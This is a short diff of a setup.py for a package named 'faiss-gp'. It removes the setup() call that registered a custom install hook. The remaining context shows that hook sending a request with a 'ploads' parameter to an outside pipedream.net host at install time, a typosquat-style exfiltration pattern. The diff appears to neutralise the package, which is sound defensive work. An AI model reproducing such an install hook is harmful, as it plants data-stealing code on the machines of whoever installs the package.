@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("https://eov7j44ljyo6juj.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='faiss-gp', #package name
-      version='1.0.2',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                            
